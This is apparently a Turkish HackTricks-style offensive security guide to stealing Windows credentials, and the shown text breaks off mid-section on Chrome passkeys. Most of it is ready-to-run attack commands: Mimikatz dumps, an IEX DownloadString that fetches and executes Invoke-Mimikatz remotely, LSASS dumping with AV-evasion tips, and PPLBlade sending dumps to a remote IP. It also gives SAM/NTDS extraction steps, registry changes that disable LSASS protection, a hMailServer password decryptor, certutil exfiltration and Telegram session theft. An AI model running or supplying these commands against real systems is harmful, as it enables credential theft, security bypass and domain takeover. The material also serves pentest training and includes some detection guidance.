# Windows Kimlik Bilgilerini Çalma

{{#include ../../banners/hacktricks-training.md}}

## Kimlik Bilgileri Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatz'in yapabildiği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md)** bulun.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Bazı olası kimlik bilgisi korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'in bazı kimlik bilgilerini çıkarmasını önleyebilir.**

## Meterpreter ile Kimlik Bilgileri

Hedefin içinde **parola ve hash aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **aracını** kullanın.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV Atlatma

### Procdump + Mimikatz

**[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'ten Procdump yasal bir Microsoft aracı olduğundan**, Defender tarafından tespit edilmez.\
Bu aracı **lsass sürecini dump'lamak**, **dump'ı indirmek** ve **kimlik bilgilerini dump'tan yerel olarak çıkarmak** için kullanabilirsiniz.

[SharpDump](https://github.com/GhostPack/SharpDump) da kullanabilirsiniz.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak gerçekleştirilir: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV** çözümleri, **lsass.exe'yi dump etmek için procdump.exe kullanımını** **zararlı** olarak **algılayabilir**; bunun nedeni **"procdump.exe" ve "lsass.exe"** dizelerini **algılamalarıdır**. Bu nedenle, **lsass.exe adını** kullanmak **yerine**, lsass.exe'nin **PID** değerini **argüman** olarak **procdump'a iletmek** daha **gizli** bir yöntemdir.

### **comsvcs.dll** ile lsass dump etme

`C:\Windows\System32` konumunda bulunan **comsvcs.dll** adlı DLL, bir çökme durumunda **process memory dump etmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **function** içerir.\
İlk iki argümanın kullanılması önemli değildir; üçüncü argüman ise üç bileşene ayrılır. Dump edilecek process'in ID'si ilk bileşeni, dump dosyasının konumu ikinci bileşeni, üçüncü bileşen ise yalnızca **full** sözcüğünü oluşturur. Başka seçenek yoktur.\
Bu üç bileşen ayrıştırıldıktan sonra DLL, dump dosyasını oluşturur ve belirtilen process'in belleğini bu dosyaya aktarır.\
**comsvcs.dll**, lsass process'ini dump etmek için kullanılabilir; böylece procdump'ı yükleyip çalıştırma gereği ortadan kalkar. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.<sup>[[9]](#references)</sup>

Çalıştırmak için aşağıdaki komut kullanılır:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Bu süreci [**lssasy**](https://github.com/Hackndo/lsassy) ile otomatikleştirebilirsiniz.**

### **Task Manager ile lsass dökümü alma**

1. Görev çubuğuna sağ tıklayın ve Task Manager'a tıklayın
2. More details'a tıklayın
3. Processes sekmesinde "Local Security Authority Process" işlemini bulun
4. "Local Security Authority Process" işlemine sağ tıklayın ve "Create dump file"a tıklayın.

### procdump ile lsass dökümü alma

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan, Microsoft tarafından imzalanmış bir binary'dir.

Önceden oluşturulmuş bir tam sistem çökme dökümü veya erişilebilir bir kullanıcı klasöründe sıkıştırılmış bir kopya, çevrimdışı analiz için kimlik bilgisi materyali içerebilir. `MEMORY.DMP` ve `MEMORY.7z` gibi dosya adları yalnızca inceleme ipuçlarıdır: kaynağını ve erişimi doğrulayın; kullanılabilir veya güncel kimlik bilgileri içerdiğini varsaymayın.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## PPLBlade ile lsass dökümü alma

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dökümünü obfuscate etmeyi ve diske yazmadan uzak iş istasyonlarına aktarmayı destekleyen bir Protected Process Dumper Tool'dur.

**Temel işlevler**:

1. PPL korumasını atlatma
2. Defender'ın imza tabanlı algılama mekanizmalarından kaçınmak için bellek döküm dosyalarını obfuscate etme
3. Bellek dökümünü diske yazmadan RAW ve SMB yükleme yöntemleriyle yükleme (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – MiniDumpWriteDump kullanmadan SSP tabanlı LSASS dökümü

Ink Dragon, `MiniDumpWriteDump` çağrısı yapmayan ve bu nedenle bu API üzerindeki EDR hook'larını hiç tetiklemeyen, **LalsDumper** adlı üç aşamalı bir dumper kullanıyor:<sup>[[3]](#references)</sup>

1. **Aşama 1 loader (`lals.exe`)** – `fdp.dll` içinde 32 küçük `d` karakterinden oluşan bir yer tutucu arar, bunu `rtu.txt` dosyasının mutlak yolu ile değiştirir, yamalanmış DLL'yi `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Böylece **LSASS**, kötü amaçlı DLL'yi yeni bir Security Support Provider (SSP) olarak yükler.
2. **LSASS içindeki Aşama 2** – LSASS `nfdp.dll` dosyasını yüklediğinde DLL, `rtu.txt` dosyasını okur, her baytı `0x20` ile XOR'lar ve yürütmeyi devretmeden önce çözülen blob'u belleğe eşler.
3. **Aşama 3 dumper** – Belleğe eşlenen payload, hash'lenmiş API adlarından çözümlenen **doğrudan syscall**'ları kullanarak MiniDump mantığını yeniden uygular (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` adlı özel bir export, `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış bir LSASS dökümünü dosyaya yazar ve handle'ı kapatır; böylece daha sonra exfiltration yapılabilir.

Operatör notları:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt` dosyalarını aynı dizinde tutun. Aşama 1, sabit kodlanmış yer tutucuyu `rtu.txt` dosyasının mutlak yolu ile değiştirir; bu nedenle dosyaları ayırmak zinciri bozar.
* Kayıt işlemi, `nfdp` değerinin `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` konumuna eklenmesiyle gerçekleşir. LSASS'in SSP'yi her açılışta yeniden yüklemesi için bu değeri kendiniz ekleyebilirsiniz.
* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dökümlerdir. Dosyaları yerel olarak açın, ardından kimlik bilgilerini çıkarmak için Mimikatz/Volatility'ye verin.
* `AddSecurityPackageA` çağrısının başarılı olması için `lals.exe` yönetici/SeTcb haklarıyla çalıştırılmalıdır; çağrı döndükten sonra LSASS, sahte SSP'yi şeffaf biçimde yükler ve Aşama 2'yi yürütür.
* DLL'yi diskten silmek, onu LSASS'ten çıkarmaz. Ya kayıt defteri girdisini silip LSASS'i yeniden başlatın (bilgisayarı yeniden başlatın) ya da uzun süreli kalıcılık için olduğu gibi bırakın.

## CrackMapExec

### SAM hash'lerini dök

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Hedef DC'den NTDS.dit dökümünü al

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Hedef DC'den NTDS.dit parola geçmişini dök

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM ve SYSTEM Dosyalarını Çalma

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ konumlarında **bulunmalıdır**. Ancak **korundukları için bunları normal bir şekilde kopyalayamazsınız**.

### Registry'den

Bu dosyaları ele geçirmenin en kolay yolu, Registry'den bir kopya almaktır:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Bu dosyaları** Kali makinenize **indirin** ve şu komutu kullanarak **hash'leri çıkarın**:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Bu hizmeti kullanarak korumalı dosyaları kopyalayabilirsiniz. Yönetici olmanız gerekir.

#### vssadmin kullanımı

vssadmin ikilisi yalnızca Windows Server sürümlerinde kullanılabilir.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ancak aynı işlemi **Powershell** üzerinden de yapabilirsiniz. Aşağıda **SAM dosyasının nasıl kopyalanacağına** dair bir örnek verilmiştir (kullanılan sürücü "C:" ve dosya C:\users\Public konumuna kaydediliyor), ancak bunu korumalı herhangi bir dosyayı kopyalamak için kullanabilirsiniz:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kitaptaki kod: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) dosyasını da kullanabilirsiniz.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Kimlik Bilgileri - NTDS.dit**

**NTDS.dit** dosyası, **Active Directory**'nin kalbi olarak bilinir ve kullanıcı nesneleri, gruplar ve üyelikleri hakkında önemli veriler içerir. Etki alanı kullanıcılarına ait **password hash**'leri burada depolanır. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç temel tablo tutulur:

- **Data Table**: Kullanıcılar ve gruplar gibi nesnelerin ayrıntılarını depolar.
- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her nesneye ait **security descriptor**'lar burada tutulur ve depolanan nesnelerin güvenliği ile erişim denetimi sağlanır.

Christoffer Andersson'ın veritabanı katmanına ilişkin araştırması, bu tabloları ve sürüme özgü davranışlarını daha ayrıntılı biçimde belgeliyor.<sup>[[8]](#references)</sup>

Windows, bu dosyayla etkileşim kurmak için _Ntdsa.dll_ kullanır ve bu dosya _lsass.exe_ tarafından kullanılır. Ardından **NTDS.dit** dosyasının bir **kısmı**, **`lsass` belleğinde** bulunabilir (muhtemelen performansı artırmak için bir **cache** kullanıldığından, en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki hash'leri çözme

Hash üç kez şifrelenmiştir:

1. **BOOTKEY** ve **RC4** kullanarak Password Encryption Key (**PEK**) şifrelemesini çözün.
2. **PEK** ve **RC4** kullanarak **hash** şifrelemesini çözün.
3. **DES** kullanarak **hash** şifrelemesini çözün.

**PEK**, her etki alanı denetleyicisinde **aynı değere** sahiptir; ancak bu değer, ilgili etki alanı denetleyicisinin **SYSTEM** kayıt kovanındaki DC'ye özgü **BOOTKEY** ile **NTDS.dit** içinde **şifrelenir**. Bu nedenle, kimlik bilgilerini çıkarmak için hem **NTDS.dit** hem de **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) gerekir.

### Ntdsutil kullanarak NTDS.dit kopyalama

Windows Server 2008'den beri kullanılabilir.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

NTDS.dit dosyasını kopyalamak için [**volume shadow copy**](#stealing-sam-and-system) trick'ini de kullanabilirsiniz. **SYSTEM file**'ın da bir kopyasına ihtiyacınız olacağını unutmayın (yine [**registry'den dump edin veya volume shadow copy**](#stealing-sam-and-system) trick'ini kullanın).

### **NTDS.dit dosyasından hash'leri çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettikten** sonra, hash'leri **çıkarmak** için _secretsdump.py_ gibi araçları kullanabilirsiniz:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Geçerli bir domain admin kullanıcısı kullanarak bunları **otomatik olarak da çıkarabilirsiniz**:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**Büyük NTDS.dit dosyaları** için [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanarak çıkarmak önerilir.

Son olarak, **metasploit modülünü** de kullanabilirsiniz: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit dosyasındaki domain nesnelerini SQLite veritabanına çıkarma**

NTDS nesneleri [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Ham NTDS.dit dosyası zaten elde edilmişse, daha fazla bilgi çıkarmak için yalnızca secrets değil, nesnelerin tamamı ve öznitelikleri de çıkarılır.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive isteğe bağlıdır ancak secrets decryption işlemini mümkün kılar (NT ve LM hashes, cleartext passwords gibi supplemental credentials, kerberos veya trust keys, NT ve LM password histories). Diğer bilgilerin yanı sıra şu veriler çıkarılır: hashes içeren user ve machine accounts, UAC flags, son logon ve password change zaman damgaları, account açıklamaları, adlar, UPN, SPN, groups ve recursive memberships, organizational units ağacı ve üyelikleri, trust türleri, yönü ve attributes bilgileriyle birlikte trusted domains...

## Lazagne

Binary dosyasını [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu binary dosyasını çeşitli software’lerden credentials çıkarmak için kullanabilirsiniz.

```
lazagne.exe all
```

## SAM ve LSASS'ten kimlik bilgilerini çıkarmaya yönelik diğer araçlar

### Windows credentials Editor (WCE)

Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. Şuradan indirin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarın

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM dosyasından kimlik bilgilerini çıkarın

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Şuradan indirin:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7), ardından **çalıştırmanız** yeterlidir; parolalar çıkarılır.

## Boştaki RDP oturumlarını inceleme ve güvenlik denetimlerini zayıflatma

Ink Dragon’ın FinalDraft RAT’inde, teknikleri her red-teamer için kullanışlı olan bir `DumpRDPHistory` tasker’ı bulunur:<sup>[[3]](#references)</sup>

### DumpRDPHistory tarzı telemetri toplama

* **Giden RDP hedefleri** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` konumundaki her kullanıcı hive’ını ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint` değerini ve son yazma zaman damgasını saklar. PowerShell ile FinalDraft’ın mantığını uygulayabilirsiniz:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Gelen RDP kanıtı** – kutuyu kimin yönettiğini belirlemek için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` günlüğünde **21** (başarılı oturum açma) ve **25** (bağlantı kesilmesi) Event ID'lerini sorgulayın:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Hangi Domain Admin'in düzenli olarak bağlandığını öğrendikten sonra, **bağlantısı kesilmiş** oturumu hâlâ açıkken LSASS'ı (LalsDumper/Mimikatz ile) dump edin. CredSSP + NTLM fallback, doğrulayıcılarını ve token'larını LSASS'te bırakır; bunlar daha sonra SMB/WinRM üzerinden tekrar oynatılarak `NTDS.dit` ele geçirilebilir veya domain controller'larda persistence sağlanabilir.

### FinalDraft'ın hedeflediği Registry downgrade'leri

Aynı implant, credential theft'i kolaylaştırmak için birkaç Registry anahtarını da kurcalar:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1`, gelen RDP bağlantıları için Restricted Admin'i devre dışı bırakır; bu mod üzerinden pass-the-hash özelliğini **etkinleştirmez**. Değeri `0` olarak ayarlamak hedefte Restricted Admin kullanımına izin verir, ancak istemci `/RestrictedAdmin` isteğinde bulunmalı veya Restricted Admin'i zorunlu kılan bir ilke kullanmalıdır.<sup>[[14]](#references)</sup> Tek başına bir hash, uzaktan yönetici hakları sağlamaz; bkz. [RDP kimlik doğrulama önkoşulları](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1`, yerel yöneticilerin ağ üzerinden kısıtlanmamış tokenlar alması için UAC token filtrelemesini devre dışı bırakır.
* `DSRMAdminLogonBehavior=2`, DC çevrimiçiyken DSRM yöneticisinin oturum açmasına izin vererek saldırganlara yerleşik, yüksek ayrıcalıklı başka bir hesap sağlar.
* `RunAsPPL=0`, LSASS PPL korumalarını kaldırarak LalsDumper gibi döküm araçlarının belleğe erişmesini kolaylaştırır.

## hMailServer yapılandırma kimlik bilgileri (sızma sonrası)

Kurulum düzenine göre `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` ve `C:\ProgramData\hMailServer\hMailServer.ini` dosyalarının tam yolunu kontrol edin. Okunabilir, boş olmayan bir `[Security] AdministratorPassword=` değeri, hMailServer yönetici parolası hash'idir; Windows Administrator parolasına kanıt oluşturmaz. Bu kimlik bilgisi elde edilirse, Windows hesabına geçiş için parola tekrarının ve oturum açma haklarının ayrıca doğrulanması gerekir.

SQL CE veritabanı kullanan kurulumlarda, INI dosyasındaki ayrı `[Database] Password=` değeri veritabanını korur. Eski kurulumlarda bu değer, statik `THIS_KEY_IS_NOT_SECRET` anahtarı ve 4 baytlık sözcük endian dönüşümleri kullanılarak Blowfish ile şifrelenmiştir. INI dosyasındaki hex dizgesini şu Python kod parçacığıyla kullanın:<sup>[[2]](#references)</sup>

Öncelikle mevcut hesabın hem INI dosyasını hem de karşılık gelen SQL CE `.sdf` veritabanını okuyabildiğini doğrulayın. INI parolası veritabanını korur; veritabanında depolanan posta kutusu hesabı hash'lerinden ayrıdır. Kullanımdaki bir veritabanını incelemek veya yükseltmek için canlı dosyayı değil, bir **kopyasını** kullanın.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Açık metin parolayla, dosya kilitlerini önlemek için SQL CE veritabanını kopyalayın, 32 bit provider'ı yükleyin ve hash'leri sorgulamadan önce gerekirse yükseltin:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` sütunu hMailServer hash formatını (`hashcat` mode `1421`) kullanır. Kırılmış bir posta kutusu parolası, yalnızca yerel/etki alanı hesabında yeniden kullanılıyorsa ve bu hesap gerekli uzaktan oturum açma haklarına sahipse Windows kullanıcısına geçiş için kullanılabilir.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Bazı araçlar, LSA logon callback `LsaApLogonUserEx2`'yi intercept ederek **plaintext logon passwords** yakalar. Amaç, kimlik doğrulama paketi callback'ini hook etmek veya sarmalamaktır; böylece kimlik bilgileri **logon sırasında** (hash'lenmeden önce) yakalanır ve ardından diske yazılır veya operatöre iletilir. Bu genellikle LSA'ya inject olan veya LSA'ya kaydolan, ardından her başarılı etkileşimli/ağ logon olayını kullanıcı adı, etki alanı ve parolayla birlikte kaydeden bir yardımcı araç olarak uygulanır.<sup>[[1]](#references)</sup>

Operasyonel notlar:
- Yardımcı aracı kimlik doğrulama yoluna yüklemek için yerel admin/SYSTEM gerekir.
- Yakalanan kimlik bilgileri yalnızca bir logon gerçekleştiğinde görünür (hook'a bağlı olarak etkileşimli, RDP, servis veya ağ logon'u).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS), kayıtlı bağlantı bilgilerini kullanıcı başına bir `sqlstudio.bin` dosyasında saklar. Özel dump araçları dosyayı ayrıştırıp kayıtlı SQL kimlik bilgilerini kurtarabilir. Yalnızca komut çıktısı döndüren shell'lerde dosya genellikle Base64 olarak kodlanıp stdout'a yazdırılarak exfiltrate edilir.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Operatör tarafında, kimlik bilgilerini kurtarmak için dosyayı yeniden derleyin ve dumper'ı yerel olarak çalıştırın:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Chrome DevTools Protocol üzerinden tarayıcı oturumu ve cookie hırsızlığı

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Telegram Desktop `tdata` oturumu hırsızlığı

Telegram Desktop, yetkilendirme ve hesap durumunu **`tdata`** dizininde tutar. Kopyalanan bir oturum, yetkilendirme geçerli olduğu sürece hesap parolası olmadan kimlik doğrulamak için uyumlu araçlarla yüklenebilir; yerel veri şifrelemesi etkinse stealer'ın parolaya da ihtiyacı vardır. Ardından kimliği doğrulanmış bir oturum; kimlik verilerini, sohbet ve üyelik meta verilerini, mesajları ve indirilebilir medyayı açığa çıkarabilir.<sup>[[10]](#references)</sup>

### Keşif ve edinme

Yüklü ve taşınabilir kurulum konumlarının ikisini de arayın; Microsoft Store paket adları değişiklik gösterebilir, bu nedenle `TelegramMessenge` içeren paket dizinlerini listeleyin ve `LocalCache\Roaming` alt ağaçlarını inceleyin.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Sıradan okuma işlemleri başarısız olursa ve süreç token'ı `SeBackupPrivilege` ayrıcalığını **zaten içeriyor ve etkinleştirmişse**, backup-aware erişim bir alternatif sunar; bu yöntem ayrıcalığı edinmez veya süreci yükseltmez. Gerekli token ayrıcalıkları mevcutsa `FILE_FLAG_BACKUP_SEMANTICS` ile `CreateFileW`, backup/restore semantiği isteyebilir ve dosya güvenlik denetimlerini atlayabilir; ancak bu bayrak tek başına uyumsuz bir paylaşım kilidini aşamaz.<sup>[[10]](#references)[[11]](#references)</sup>

Kullanımda kilitli dosyalar için bir **Volume Shadow Copy** oluşturup okuyun; ACL tarafından engellenen dosyalar için `robocopy /B`, backup modunu kullanır ve dosya ile dizin ACL'lerini atlar.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Bant genişliğini gözeten bir implant, önce yalnızca dosya yollarının envanterini gönderebilir, C2'den bir anlık görüntü tanımlayıcısı ve C2'de zaten kayıtlı olan yolları alabilir, ardından yalnızca eksik dosyaları yükleyebilir. Bu nedenle, özyinelemeli `tdata` envanterlemesinden sonraki küçük artımlı aktarımlar bile oturum hırsızlığının başarılı olduğunu gösterebilir.<sup>[[10]](#references)</sup>

### Tespit ve müdahale

Telegram dışındaki bir işlem tarafından `tdata` dizinine özyinelemeli erişimi; `SeBackupPrivilege` etkinleştirilmesi, yedekleme semantiği kullanan dosya açma işlemleri, VSS etkinliği veya `/B` kullanan bir alt `robocopy.exe` işlemiyle ilişkilendirin. Ayrıca `%APPDATA%` ve `%LOCALAPPDATA%\Packages` dizinlerinin hızla taranmasını ve ardından aynı işlemden yapılan giden bağlantıları araştırın. İhlal sonrasında, tanımadığınız oturumları sonlandırmak için **Settings → Devices** (veya **Privacy & Security → Active Sessions**) bölümünü kullanın; yalnızca iki adımlı doğrulamayı etkinleştirmek, daha önce çalınmış bir yetkilendirmeyi iptal etmez.<sup>[[10]](#references)[[13]](#references)</sup>

## Windows'ta Chrome'dan Passkeys / WebAuthn kimlik bilgisi hırsızlığı

**Chrome + Google Password Manager ile eşitlenen passkeys** kullanan bir Windows ana bilgisayarında **kurban kullanıcısı** olarak kod yürütme elde edilirse, **admin/SYSTEM olmadan da** passkeys ilgi çekici bir post-exploitation hedefi hâline gelir.<sup>[[4]](#references)</sup>

### İlgi çekici yerel artefaktlar

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
